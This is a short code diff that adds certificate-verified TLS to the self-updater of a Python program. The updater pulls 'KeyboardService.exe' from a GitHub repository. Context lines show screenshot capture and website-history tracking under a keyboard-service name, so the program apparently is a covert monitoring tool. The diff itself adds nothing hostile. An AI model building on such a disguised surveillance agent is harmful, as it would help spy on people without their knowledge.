@@ -20,6 +20,8 @@ import ctypes
 import tempfile
 import uuid
 import getpass
+import ssl
+import certifi
 from datetime import datetime, timedelta
 from io import BytesIO
 from urllib.parse import urlparse
@@ -48,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.16"
+APP_VERSION = "1.2.17"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1664,7 +1666,14 @@ def version_tuple(value):
     return tuple(int(part or 0) for part in match.groups())
 
 
+def github_ssl_context():
+    context = ssl.create_default_context()
+    context.load_verify_locations(cafile=certifi.where())
+    return context
+
+
 def download_update():
+    ssl_context = github_ssl_context()
     request = Request(
         UPDATE_API_URL,
         headers={
@@ -1672,7 +1681,7 @@ def download_update():
             "User-Agent": f"KeyboardService/{APP_VERSION}",
         },
     )
-    with urlopen(request, timeout=15) as response:
+    with urlopen(request, timeout=15, context=ssl_context) as response:
         release = json.loads(response.read().decode("utf-8"))
 
     latest_tag = str(release.get("tag_name", "")).strip()
@@ -1698,7 +1707,7 @@ def download_update():
     )
     digest = hashlib.sha256()
     try:
-        with urlopen(download_request, timeout=120) as response, open(temporary_path, "wb") as output:
+        with urlopen(download_request, timeout=120, context=ssl_context) as response, open(temporary_path, "wb") as output:
             while True:
                 chunk = response.read(1024 * 1024)
                 if not chunk:
